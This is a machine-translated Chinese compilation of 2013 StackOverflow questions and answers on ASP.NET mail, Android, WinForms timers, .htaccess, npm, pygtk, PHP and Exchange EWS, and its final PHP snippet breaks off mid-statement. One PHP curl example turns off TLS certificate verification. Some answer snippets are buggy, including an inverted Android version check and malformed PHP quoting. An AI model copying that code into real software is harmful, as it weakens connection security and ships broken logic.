# StackOverflow 问答 15879000-15879999

# asp.net - 从本地主机发送邮件是正确的。但不能从互联网空间（网络）工作

> ID：15879004
> 
> 赞同：0
> 
> 时间：2013-04-08T12:26:53.900
> 
> 标签：asp.net, deployment, smtp, umbraco, sendmail

我可以从本地主机发送电子邮件。但是当我从**互联网空间**发送电子邮件时，我遇到了问题。是网站面板的问题吗？我该如何解决？

> **System.Net.Mail.SmtpException：** SMTP 服务器需要安全连接或客户端未通过身份验证。服务器响应为：5.5.1 需要身份验证。在 System.Net.Mail.SmtpTransport.SendMail(MailAddress sender, MailAddressCollection recipients, String deliveryNotify, Boolean allowUnicode, SmtpFailedRecipientException& exception) 的 System.Net.Mail.MailCommand.CheckResponse(SmtpStatusCode statusCode, String response) 了解更多信息

在 System.Net.Mail.SmtpClient.Send（MailMessage 消息）

在 Defraz.Movafaqiyat.WebApp.usercontrols.AppCodes.MailHelper.SendMailMessage（字符串来自，字符串到，字符串密件抄送，字符串抄送，字符串主题，字符串正文，字符串域名称，布尔 isBodyHtml）

**webconfig的一部分：**

```
<smtp from="movafaqiyat@gmail.com">
    <network host="smtp.gmail.com" port="587" userName="movafaqiyat@gmail.com" password="mypassword" defaultCredentials="false" enableSsl="true" />
  </smtp> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:56:08.863

尝试使用 port="465" （[在邮件客户端中设置 POP](http://support.google.com/mail/answer/13287?hl=en)）并确保在您用于发送电子邮件的服务器上打开此端口。

# android - 卸载时如何删除应用程序附带的所有图像

> ID：15879010
> 
> 赞同：0
> 
> 时间：2013-04-08T12:27:13.567
> 
> 标签：android, android-widget, wallpaper

我正在为一个带有图像的项目创建一个简单的应用程序，当您按下按钮时，图像上方有一个按钮，图像将成为手机的壁纸。

我已经这样做了，但是对于我的项目，如果卸载了应用程序，我需要删除墙纸我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:30:43.703

将您的图像保存在[这里](http://developer.android.com/reference/android/content/Context.html#getExternalFilesDir%28java.lang.String%29)，当您卸载应用程序时，此文件夹将被删除

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:27:40.877

如果您查看 的 Android 文档`Intent` [`ACTION_PACKAGE_REMOVED`](http://developer.android.com/reference/android/content/Intent.html#ACTION_PACKAGE_REMOVED)，您会看到除了*您自己的应用程序之外，任何其他**感兴趣的应用程序*（注册接收此广播的其他应用程序）都将接收此广播操作。

 *来自 developer.android.com 网站的报价：

> 广播动作：现有应用程序包已从设备中删除。数据包含包的名称。正在安装的包没有收到这个 Intent。

不幸的是，因为您的应用程序永远无法检测到它正在被删除，所以您无法触发将更改设备上壁纸的特定功能。如果可能（**它不是**），一个简单的函数（代码如下）将向用户显示*选择壁纸*选择器。

```
Intent intent = new Intent(Intent.ACTION_SET_WALLPAPER);
startActivity(Intent.createChooser(intent, "Select Wallpaper")); 
```

一旦他/她卸载了您的应用程序，用户将不得不手动更改它。

话虽如此，就删除所有应用程序创建的文件而言，让 Android 为您处理。根据 API 使用以下选项之一：

API 大于 8 或更高：[`getExternalCacheDir`](http://developer.android.com/reference/android/content/Context.html#getExternalCacheDir)

API 7 或更低版本：[`getExternalStorageDirectory`](http://developer.android.com/reference/android/os/Environment.html#getExternalStorageDirectory).

像这样的东西可以让您根据设备 API 确定使用哪一个：

```
int currentAPIVersion = android.os.Build.VERSION.SDK_INT;
if (currentAPIVersion >= android.os.Build.VERSION_CODES.ECLAIR) {
    // USE getExternalStorageDirectory
} else {
    // USE getExternalCacheDir
} 
```*

# c# - 应用程序在每个计时器滴答声上滞后

> ID：15879013
> 
> 赞同：1
> 
> 时间：2013-04-08T12:27:26.537
> 
> 标签：c#, winforms, timer

我有一个应用程序，它会定期对服务器进行 ping 操作，以便为您提供连接延迟。从我读过的`System.Timers.Timer`内容来看，它是在与 UI 不同的线程上运行的。

```
public MainForm()
{
    InitializeComponent();
    _timer = new Timer();
    _timer.Tick += new EventHandler(timer_Tick);
    _timer.Interval = 1000;
    _timer.Start();
} 
```

我有一个`NotifyIcon`显示`ContextMenu`这个 ping 的结果。但是我注意到`ContextMenu`每次计时器滴答时都会滞后，我不知道为什么。

编辑：完全忘记添加 timer_tick 功能

```
 var selectedServer = Properties.Settings.Default.SelectedServer;
            PingReply reply;
            switch (selectedServer)
            {
                case "NA":
                    reply = _pvpnetClient.Send("64.7.194.1");
                    break;
                case "EUW":
                    reply = _pvpnetClient.Send("95.172.65.1");
                    break;
                case "EUN":
                    reply = _pvpnetClient.Send("66.150.148.1");
                    break;
                default:
                    reply = _pvpnetClient.Send("64.7.194.1");
                    break;
            }

            if (reply == null || reply.Status != IPStatus.Success) return;
            var returnedPing = reply.RoundtripTime;

            LoLPing.Text = @"Server: " + selectedServer + @" - Ping: " + reply.RoundtripTime + @"ms";
            PingText.Text = @"Ping: " + reply.RoundtripTime + @"ms";
            if (returnedPing < 120f)
            {
                LoLPing.Icon = Properties.Resources.GreenIcon;
            }
            else if (returnedPing > 120f && returnedPing < 200)
            {
                LoLPing.Icon = Properties.Resources.YellowIcon;
            }
            else
            {
                LoLPing.Icon = Properties.Resources.RedIcon;
            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:44:04.107

[http://msdn.microsoft.com/en-us/library/system.timers.timer(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/system.timers.timer(v=vs.100).aspx)

“基于服务器的定时器设计用于多线程环境中的工作线程。”

它不会自动生成它自己的线程。如果它确实生成了自己的线程，那么在尝试更新控件而不使用`Invoke`or时会出现异常`BeginInvoke`。

我会使用一个`BackgroundWorker`对象来执行此操作，该对象的`DoWork`处理程序包含一个带有 a 的循环`Thread.Sleep`。然后在循环中执行所有慢 ping 工作`DoWork`，并拥有一个 GUI 函数来获取`returnedPing`并执行图标更新。使用 Invoke 调用此 GUI 函数以在 GUI 线程上恢复 GUI 操作。

```
class SlowOperation
{
    BackgroundWorker m_worker;
    void StartPolling()
    {
        m_worker = new BackgroundWorker();
        m_worker.WorkerSupportsCancellation = true;
        m_worker.WorkerReportsProgress = true;
        m_worker.DoWork += m_worker_DoWork;
        m_worker.ProgressChanged += m_worker_ProgressChanged;
    }

    void m_worker_DoWork(object sender, DoWorkEventArgs e)
    {
        while (!m_worker.CancellationPending)
        {
            int returnedPing = 0;
            // Get my data
            m_worker.ReportProgress(0, returnedPing);
            Thread.Sleep(1000);
        }
    }

    void m_worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
        myForm.Invoke(myForm.UpdateMyPing((int)e.UserState));
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:45:16.017

这完全取决于 Send 方法的`_pvpnetClient`运行时间。

你正在运行一个`System.Windows.Timer`（我知道是因为这个`Tick`事件），所以这个方法将在主线程上调用，它会阻止所有的 GUI 更新，直到它完成。如果您想在另一个线程上完成工作，您可以使用该`System.Timers.Timer`对象，但您必须调用回主线程来更新 GUI 元素。

# excel - Excel，无法连接到 XMLA Webservice

> ID：15879014
> 
> 赞同：0
> 
> 时间：2013-04-08T12:27:28.073
> 
> 标签：excel, database, connection, xmla

我尝试在 Excel 中创建与 XMLA Web 服务的连接。我正在使用 Analysis Services 连接助手。我用 Web 服务 url 和凭据填充第一个掩码。然后我在服务器上收到 10 个 DISCOVER_PROPERTIES 和一个 DISCOVER_SCHEMA_ROWSETS 请求。在最后一个 DISCOVER_SCHEMA_ROWSETS 之后，我在 excel 中收到一个通知（没有错误对话框），数据连接助手在给定数据源中找不到数据库列表。我可以在哪里获得有关发生错误的更多信息？我很感激任何帮助！

DISCOVER_SCHEMA_ROWSETS 消息：

```
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <Session xmlns="urn:schemas-microsoft-com:xml-analysis" SessionId="D5C7494A-14DC-47F4-B9A5-AC6A487BCC38"/>
  </soap:Header>
  <soap:Body>
    <Discover xmlns="urn:schemas-microsoft-com:xml-analysis">
      <RequestType>DISCOVER_SCHEMA_ROWSETS</RequestType>
      <Restrictions>
        <RestrictionList/>
      </Restrictions>
      <Properties>
        <PropertyList>
          <LocaleIdentifier>1031</LocaleIdentifier>
        </PropertyList>
      </Properties>
    </Discover>
  </soap:Body>
</soap:Envelope> 
```

和发现响应：

```
<?xml version="1.0" encoding="UTF-8" ?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <DiscoverResponse xmlns="urn:schemas-microsoft-com:xml-analysis">
      <return>
        <root xmlns="urn:schemas-microsoft-com:xml-analysis:rowset">
          <xsd:schema xmlns="urn:schemas-microsoft-com:xml-analysis:rowset" targetNamespace="urn:schemas-microsoft-com:xml-analysis:rowset" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:sql="urn:schemas-microsoft-com:xml-sql" elementFormDefault="qualified">
            <xsd:element name="root">
              <xsd:complexType>
                <xsd:sequence minOccurs="0" maxOccurs="unbounded">
                  <xsd:element name="row" type="row"/>
                </xsd:sequence>
              </xsd:complexType>
            </xsd:element>
            <xsd:complexType name="row">
              <xsd:sequence maxOccurs="unbounded" minOccurs="0">
                <xsd:element name="SchemaName" type="xsd:string" minOccurs="0" maxOccurs="1" sql:field="SchemaName"/>
              </xsd:sequence>
            </xsd:complexType>
          </xsd:schema>
          <row>
            <SchemaName>DISCOVER_DATASOURCES</SchemaName>
          </row>
          <row>
            <SchemaName>DISCOVER_PROPERTIES</SchemaName>
          </row>
          <row>
            <SchemaName>DISCOVER_SCHEMA_ROWSETS</SchemaName>
          </row>
          <row>
            <SchemaName>DISCOVER_ENUMERATORS</SchemaName>
          </row>
          <row>
            <SchemaName>DISCOVER_KEYWORDS</SchemaName>
          </row>
          <row>
            <SchemaName>DISCOVER_LITERALS</SchemaName>
          </row>
          <row>
            <SchemaName>DBSCHEMA_CATALOGS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_CUBES</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_DIMENSIONS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_MEASURES</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_HIERARCHIES</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_LEVELS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_MEMBERS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_PROPERTIES</SchemaName>
          </row>
          <row>
            <SchemaName>DBSCHEMA_COLUMNS</SchemaName>
          </row>
          <row>
            <SchemaName>DBSCHEMA_PROVIDER_TYPES</SchemaName>
          </row>
          <row>
            <SchemaName>DBSCHEMA_TABLES</SchemaName>
          </row>
          <row>
            <SchemaName>DBSCHEMA_TABLES_INFO</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_ACTIONS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_FUNCTIONS</SchemaName>
          </row>
          <row>
            <SchemaName>MDSCHEMA_SETS</SchemaName>
          </row>
        </root>
      </return>
    </DiscoverResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:38:58.757

首先通过将 web 服务的 URL 放入浏览器中进行测试，看看它是否工作。

您可以下载在 VBA 界面中提供插件的[Microsoft Office XP Web 服务工具包。](http://msdn.microsoft.com/en-us/library/office/aa140268%28v=office.10%29.aspx)该插件允许您为 Web 服务指定路径并为您创建类。您可以使用此类并调用您的网络服务中的函数。

# c# - 使用来自另一个类的数据动态创建 Expandoobject

> ID：15879015
> 
> 赞同：0
> 
> 时间：2013-04-08T12:27:28.357
> 
> 标签：c#

假设我有一个***元数据***类***AccountData***，它包含用于自动化测试的模拟数据。

我正在使用这些数据的子集插入到数据库中的各种表中。

**例如。1**

```
dynamic table1 = new ExpandoObject();
table1 .AccountId = AccountId;
table1 .DateOfBirth = AccountData.DateOfBirth;
table1 .Gender = AccountData.Gender;
table1 .Title = 0;
....etc 
```

**例如。2**

```
dynamic table2 = new ExpandoObject();
table2 .Forename = AccountData.Forename;
table2 .Surname = AccountData.Surname;
table2 .HomePhone = AccountData.HomePhone;
table2 .MobilePhone = AccountData.MobilePhone;
... etc 
```

我想知道是否有更优雅的方式来生成 DynamicObjects？我正在考虑一个类似的功能

```
private static ExpandoObject Generatedynamic(List<String> ColumnsToInclude)
{
//todo
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:32:52.837

ExpandoObject 实现 IDictionary<T,Y> 因此您可以像使用任何其他字典一样使用它的 Add () 方法。

我的 Github 项目之一中有一个示例-> [https://github.com/tucaz/XmlToObjectParser/blob/master/trunk/src/XmlToObjectParser/XmlToObjectParser.cs](https://github.com/tucaz/XmlToObjectParser/blob/master/trunk/src/XmlToObjectParser/XmlToObjectParser.cs)

# .htaccess - htaccess 重写到有异常的子目录

> ID：15879016
> 
> 赞同：1
> 
> 时间：2013-04-08T12:27:28.333
> 
> 标签：.htaccess

我已经设置了我的 GoDaddy 共享主机帐户，不应直接从服务器根目录运行任何脚本 - 脚本至少启动一个子目录。我也有子域也属于这一类，因为我的服务器似乎只是将子域重写到选定的文件夹。

```
/根
  WordPress
  德鲁巴
  应用程序1
  子域
     子1
     子2
     子3

```

我决定让 www.mydomain.com 启动 wordpress - 所以在对 SO 进行了大量研究并测试了一些解决方案之后 - 这是有效的 htaccess。其他解决方案导致 500 服务器内部错误，我认为这是我的托管计划的限制。

```
<IfModule mod_rewrite.c>
  RewriteEngine on
  RewriteCond %{HTTP_HOST} ^www.mydomain.com$ [NC,OR]
  RewriteCond %{REQUEST_URI} !wordpress/
  RewriteRule ^(.*)$ wordpress/$1 [L]
</IfModule> 
```

但是现在子域不再起作用，并且从服务器错误消息`The requested URL /wordpress/subdomains/sub1/ was not found on this server.`中可以明显看出我的重写规则正在为子域启动。

我尝试`RewriteCond %{REQUEST_URI} !subdomains`在 RewriteRule 之前添加一个，但没有帮助。此外`RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d`-all 重写停止工作。

**如何修改规则以便不重定向特定目录/模式？或者，如果目录存在，它不应该重写？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T17:25:07.830

尝试在您对 wordpress 的规则*之前添加它：*

```
RewriteRule ^subdomains - [L] 
```

它应该简单地让以开头的请求`/subdomains`通过而不进行任何重写。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T17:37:19.110

用这个替换你的重写规则：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteCond %{HTTP_HOST} ^(www\.)?mydomain\.com$ [NC]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ wordpress/$1 [L] 
```

这将确保`wordpress/`不对任何文件或目录进行重定向。

# php - 如何在我的控制器操作中包含 dompfg .. 现在它显示空白页

> ID：15879020
> 
> 赞同：0
> 
> 时间：2013-04-08T12:27:35.263
> 
> 标签：php, dompdf

我正在使用 dompdf 将 html 内容转换为 pdf .. 这是我的基本代码

```
$path_pdf = BASE_PATH.'/public/dompdf/dompdf_config.inc.php'; 
require_once($path_pdf); 
$html = '<p>Hello PHP</p>';         
$dompdf = new DOMPDF();
$dompdf->load_html($html);
$dompdf->render();
$dompdf->stream("sample.pdf"); 
```

但是在我包含 dompdf 的第二行...在我运行此页面时完成所有操作后，它向我显示空白屏幕..在进行一些调试后我发现 dompdf_config.inc.php 不包括...我检查了我的文件路径，是正确的。任何想法..提前谢谢。

# node.js - npm install 在命令提示符之外

> ID：15879022
> 
> 赞同：0
> 
> 时间：2013-04-08T12:27:38.993
> 
> 标签：node.js, npm

我通过了代理，并且 npm install 似乎被阻止了，我尝试了很多事情，最后我做的是按照这些[步骤](https://stackoverflow.com/a/13138231/376115)，这也失败了，离开它。

**最近我发现 git 协议被防火墙阻止的原因**

但是当我在浏览器上尝试相同的[链接](http://registry.npmjs.org/connect)（注册表/模块）时，它给了我 json。

所以我怀疑除了拍摄 npm install 命令之外，我们是否还有其他方法来安装模块。

我可以在浏览器上看到 json，希望我可以复制它，放入一个文件中，在某个文件夹中，节点假设它已安装。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:42:38.333

NPM 安装解析到文件本身。在大多数情况下，您可以将 git sub mod checkout 直接放入项目安装中的 node_modules 目录中，并且一切*正常。*

如果您也无法从 git 签出，只需从 git 项目页面下载 tarball（或 zip）存档并将生成的目录拖放到 node_modules 中。

**您可能需要使用目录顶层 package.json 文件中的字符串重命名 Zip 存档中包含的结果目录。这将在您的 require 语句中解决。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T15:03:44.340

节点包管理器在处理包方面很灵活。给定命令`npm install <package>`

> 一个包是：
> 
> a) 包含由 package.json 文件描述的程序的文件夹
> b) 包含 (a)
> c) 解析为 (b)
> d) a`<name>@<version>`在注册表上发布的带有 (c)
> e) a`<name>@<tag>`的gzip 压缩包指向 (d)
> f) a`<name>`具有满足 (e)
> g) a的“最新”标签，该标签`<git remote url>`解析为 (b)

有关更多帮助，请参阅 npm install 上的此[文档。](https://npmjs.org/doc/install.html)

# c# - Windows Phone 的复选框

> ID：15879026
> 
> 赞同：1
> 
> 时间：2013-04-08T12:27:47.250
> 
> 标签：c#, sqlite, windows-phone-7, checkbox, windows-phone-8

我在我的应用程序中使用了 4 个复选框，并创建了一个整数列表以在选中复选框时添加值。该值将使用 sqlite 存储在我的数据库中。这是我的代码：

```
List<int> hobid = new List<int>();

 private void Button_Click_1(object sender, RoutedEventArgs e)
        {

            if (Convert.ToBoolean(cricket.IsChecked))
            {
                hobid.Add(1);
            }
            else if (Convert.ToBoolean(football.IsChecked))
            {
                hobid.Add(2);
            }
            else if (Convert.ToBoolean(music.IsChecked))
            {
                hobid.Add(3);
            }
            else if (Convert.ToBoolean(reading.IsChecked))
            {
                hobid.Add(4);
            }

int rec;
   string strInserthob = "Insert into User_hobbies (User_id,Hobbies_id) values (@User_id,@Hobbies_id)";

//Here insertion is done..

 for (int i = 0; i < hobid.Count; i++)
                {
                    User_hobbies txt = new User_hobbies
                    {
                        User_id = userid,
                        Hobbies_id = hobid[i]
                    };
                    rec = (Application.Current as App).db.Insert<User_hobbies>(txt, strInserthob);
                } 
```

}

您能否建议我如何在选中复选框时获取列表中的值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T04:12:04.950

我假设按钮单击是“保存”操作。

在这种情况下，由于 else if 语句，您只保存了第一个匹配项。真正快速而讨厌的方法是删除“if else”语句并将其替换为直接 if。

```
 if (Convert.ToBoolean(cricket.IsChecked))
            {
                hobid.Add(1);
            }
 if (Convert.ToBoolean(football.IsChecked))
            {
                hobid.Add(2);
            }
 if (Convert.ToBoolean(music.IsChecked))
            {
                hobid.Add(3);
            }
 if (Convert.ToBoolean(reading.IsChecked))
            {
                hobid.Add(4);
            } 
```

# gtk - pygtk 的 TreeView 中的可复制粘贴文本

> ID：15879028
> 
> 赞同：1
> 
> 时间：2013-04-08T12:27:50.503
> 
> 标签：gtk, pygtk, gtktreeview

我遇到了这个相当出乎意料的问题。我有一个带有单个文本列的 gtk.TreeView，由 gtk.CellRendererText 呈现。我想要的是用户可以使用鼠标标记显示的文本并通过按 ctrl+c 将其放入剪贴板。（我指的是每个网络浏览器和文本编辑器中存在的非常基本的功能）。但是，gtk 不会让我这样做。我在这里有一个简单的例子，带有不可标记/不可突出显示的文本：

```
import gtk

class TreeViewExample(gtk.TreeView):

    def __init__(self):
        gtk.TreeView.__init__(self)
        self.get_selection().set_mode(gtk.SELECTION_NONE)
        self.set_grid_lines(gtk.TREE_VIEW_GRID_LINES_HORIZONTAL)

        # create  model
        self.list_store = gtk.ListStore(str)
        self.list_store.append(['Hello, this is some \n multiline text.'])
        self.list_store.append(['Another text.'])
        self.set_model(self.list_store)

        # create text column
        col = gtk.TreeViewColumn('Text Column')
        self.append_column(col)
        cell = gtk.CellRendererText()
        col.pack_start(cell, True)
        col.add_attribute(cell, 'text', 0)

class MasterWindow(object):

    def destroy(self, widget, data=None):
        gtk.main_quit()

    def __init__(self):
        self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
        self.window.set_size_request(500,500)
        self.window.connect("destroy", self.destroy)       
        self.window.add(TreeViewExample())
        self.window.show_all()

if __name__ == '__main__':
    mw = MasterWindow()
    gtk.main() 
```

我当然可以使单元格可编辑，因为可编辑模式提供了该功能。但这远非优雅，因为它是某种弹出窗口，它打破了换行并编辑了文本。我需要的是一个单元格，它不可选择、不可编辑或任何东西，但有可以复制的文本。

有没有人有办法解决吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:14:26.447

我对代码进行了一些更改。试试下面的代码，这个例子效果很好，我相信这就是你问题的答案。希望这对您将来的知识和编码有所帮助。

```
import gtk

class TreeViewExample():
    def __init__(self):        
        self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
        self.window.set_size_request(500,500)       

        model = gtk.ListStore(str)
        model.append(['a'])
        model.append(['b'])
        model.append(['c'])

        treeview = gtk.TreeView(model)

        self.renderer = gtk.CellRendererText()
        self.renderer.set_property('editable', True)
        treeview.insert_column_with_attributes(-1, 'Copy-Pastable-Editable String', self.renderer, text=0)

        self.window.add(treeview)
        self.window.show_all()
if __name__ == '__main__':
    TreeViewExample()
    gtk.main() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T16:38:35.127

我对代码进行了一些更改。试图回答**@Flimm**的问题。我会帮助你 **@Flimm**。

```
import gtk

class TreeViewExample():
    def __init__(self):        
        self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
        self.window.set_size_request(500,500)       

        self.model = gtk.ListStore(str,str)
        self.model.append(['a','b'])
        self.model.append(['c','a'])
        self.model.append(['d','a'])
        self.model.append(['e','a'])            
        self.treeview = gtk.TreeView(self.model)

        self.renderer = gtk.CellRendererText()
        self.renderer.set_property('editable', True)
        self.renderer.connect('edited', self._text_changed, 0)
        self.treeview.insert_column_with_attributes(-1, 'Copy-Pastable-Editable String', self.renderer, text=0)
        self.treeview.insert_column_with_attributes(-1, 'Copy-Pastable-Editable String', self.renderer, text=1)            

        self.window.add(self.treeview)
        self.window.show_all()

    def _text_changed( self, w, row, new_value, column):
        self.model[row][column] = new_value
if __name__ == '__main__':
    TreeViewExample()
    gtk.main() 
```

# c# - 使用 datalist 显示图像

> ID：15879033
> 
> 赞同：1
> 
> 时间：2013-04-08T12:28:19.433
> 
> 标签：c#, asp.net, visual-studio-2010, datagridview

这是我使用图像滑块显示图像的代码，`datalist`但我不知道如何在图像滑动时显示大图像这是我的代码：

```
 <div id="photos" class="galleryview">
  <img src="images/home_gallery/banner1.jpg" />
  <div style="margin: 30px 0px 0px 0px">
    <asp:DataList RepeatDirection="Horizontal" ID="dl_Images" runat="server" OnItemDataBound="dl_Images_ItemDataBound"
      OnItemCommand="dl_Images_ItemCommand">
      <ItemTemplate>
        <ul class="filmstrip">
          <div class="panel">
            <a href="" id="img_href" runat="server">
              <div class="panel-overlay" align="left">
                <li>
                  <asp:Image BorderColor="#ececec" BorderStyle="Solid" BorderWidth="1" runat="server"
                    ID="i_ProductImage" Width="104" Height="104" />
                </li>
            </a>
            </div>
            <div align="center" style="margin: 0px 0px 0px 0px">
              <asp:LinkButton ToolTip='<%# Eval("ProductID") %>' CommandArgument='<%# Eval("ProductID") %>'
                CommandName="lbclick" ID="lb_productID" runat="server" Text='<%# Eval("ProductID") %>'
                CssClass="bule-link"></asp:LinkButton>
            </div>
            <%--<asp:Label ID="l_ProductId" runat="server" Text='<%#Eval("ProductId") %>'></asp:Label>--%>
          </div>
        </ul>
      </ItemTemplate>
    </asp:DataList>
  </div>
</div> 
```

# php - 使用 PHP 和 Curl 通过 EWS 连接到 Microsoft Exchange 2007

> ID：15879036
> 
> 赞同：1
> 
> 时间：2013-04-08T12:28:28.223
> 
> 标签：php, soap, curl, exchange-server, exchangewebservices

在使用 PHP - Curl - 和 Soapui（构造和验证必要的 soap/xml 脚本以在 Curl Postfields 中发送）时，我发现在尝试例如将联系人添加到默认联系人文件夹时，我得到的所有回报都是xml 格式的 wsdl 定义。我相信我已经通过使用设置为的 Curl 代码解决了我之前的一些问题：

```
$ch = curl_init('https://'.$host.'/ews/services.wsdl'); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_NONE);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_NTLM);
curl_setopt($ch, CURLOPT_USERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: text/xml; charset=utf-8' , 'Expect:')); 
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET" ); *this resolves the 405 http code return*
curl_setopt($ch, CURLOPT_POSTFIELDS, $xmlstr);
$response = curl_exec($ch); 
```

**$xmlstr**中的数据为：

```
$xmlstr = <<<XML
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
      <CreateItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
         <SavedItemFolderId xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
            <DistinguishedFolderId Id="contacts" xmlns="http://schemas.microsoft.com/exchange/services/2006/types"/>
         </SavedItemFolderId>
         <Items xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
            <Contact xmlns="http://schemas.microsoft.com/exchange/services/2006/types">
               <FileAs>Friend A</FileAs>
               <GivenName>Don</GivenName>
               <CompanyName>AdventureWorks</CompanyName>
               <EmailAddresses>
                  <Entry Key="EmailAddress1">don@example.com</Entry>
               </EmailAddresses>
            </Contact>
         </Items>
      </CreateItem>
   </soap:Body>
</soap:Envelope>
XML; 
```

**服务器的响应/返回是：**

HTTP/1.1 200 OK内容类型 ： text /
xml最后修改时间 ：星期二，2013 年 2 月 5
日 23:00:32 GMT真正 的 X-Powered-By：ASP.NET 日期：星期一，2013 年 4 月 8 日 10:13:46 GMT 内容长度：101206

后跟 wsdl 文件中的 xml 格式定义。

我会很感激这方面的一些指导。我在几种编码语言方面经验丰富，但我目前不了解soap/xml 和PHP 中的Curl 组件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T09:05:40.630

我现在已经解决了这个问题。本质上我使用的 URL 是不正确的。Curl_init 应该是

```
$ch = curl_init('https://'.$host.'/EWS/Exchange.asmx'); 
```

并且 setopts 应更改为：

```
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: text/xml; charset=utf-8')); 
curl_setopt($ch, CURLOPT_POST, true); 
```

你不需要：

```
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET" ); 
```

# php - CSS 不起作用

> ID：15879038
> 
> 赞同：0
> 
> 时间：2013-04-08T12:28:40.323
> 
> 标签：php, html, css, include

我制作了一个简单的代码来演示我的问题。我有两个文件：

**第一个 - 主要**

```
<p id="red">RED</p>
<?php
include("color.php");
?>
<style>
#red  {color: red};
#blue {color: blue};
</style> 
```

**第二个：**

```
<p id="blue">BLUE</p> 
```

我想更改两个段落的颜色，但我不对其他 .php 文件执行相同的 CSS 代码。请问，我该怎么办？当我在其中包含另一个文件时，为什么下面的代码不起作用？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T12:33:47.193

试试这个代码它正在工作

```
<style type="text/css">
#red  {color: red;}
#blue {color: #FF0;}
</style>
<p id="red">RED</p>
<?php
include("color.php");
?> 
```

你把 ; 在 } 之后签名那是错误的。

# php - PHP：默认在选择框上显示“选择的值”

> ID：15879044
> 
> 赞同：-5
> 
> 时间：2013-04-08T12:28:59.120
> 
> 标签：php

我的表格上有一个`select`框可以搜索城市中的商店。假设它们是City 1、City 2、City 3 等。当我选择City 3 并单击搜索时，数据已发布并正确显示商店。但选择框仍将 City 1 显示为默认值。让用户一头雾水！

如果我搜索过 City 3，在重新加载页面后，选择框应该显示 City 3 为“Selected value”，而不是选择框的第一个值。

我该怎么做？请帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:33:41.623

只需读取所选城市框的值并将其存储在变量中即可。例如：-

```
$selectedCity = $_POST['city']; 
```

然后使用这个 $selectedCity 来检查当你在选择框中提交表单检查时它是否被选中，如下所示：

```
 <?php if ($selectedCity == 'City1") { ?> "selected=selected" <?php }?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:34:57.303

```
<option name="" selected></option> 
```

对于您要默认选择的那个，就这么简单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:39:32.750

这是如何完成的简单示例：

```
<?php
//======================================================== 
// Get the company names
//========================================================
$selectQuery = mysql_query("SELECT `name`, `id` FROM " . TABLE_INFO_COMPANY);
while($selectContent = mysql_fetch_assoc($selectQuery)) 
    if($_POST['id' = $selectedContent['id'])
